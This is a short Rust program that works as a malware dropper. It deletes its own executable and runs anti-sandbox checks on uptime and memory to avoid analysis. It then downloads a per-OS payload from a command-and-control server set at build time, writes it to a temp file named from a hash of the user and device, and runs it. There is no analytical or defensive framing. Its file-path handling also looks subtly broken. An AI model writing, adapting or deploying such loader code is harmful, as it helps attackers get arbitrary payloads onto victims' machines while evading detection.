use std::{
    env::{
        consts::{EXE_SUFFIX, OS},
        temp_dir,
    },
    io::Read,
    process::Command,
    time,
};

fn main() {
    let _ = houdini::disappear();

    // Basic anti-sandbox checks
    std::thread::sleep(time::Duration::from_secs(60));

    if psutil::host::uptime().unwrap() < time::Duration::from_secs(60 * 60) {
        return;
    }

    if psutil::memory::virtual_memory().unwrap().total() < 2 * 1024u64.pow(3) {
        return;
    }

    let mut resp = ureq::get(fmtools::format!(
        "http://"{env!("C2")}"/payloads/"{OS}
    ))
    .call()
    .unwrap();
    let mut data = Vec::with_capacity(resp.body().content_length().unwrap() as usize);
    resp.body_mut().as_reader().read_to_end(&mut data).unwrap();

    let id = blake3::hash(format!("{}{}", whoami::username(), whoami::devicename()).as_bytes());
    let path = temp_dir().join(id.to_string()).join(EXE_SUFFIX);
    std::fs::write(&path, data).unwrap();

    Command::new(path.to_str().unwrap()).spawn().unwrap();
}
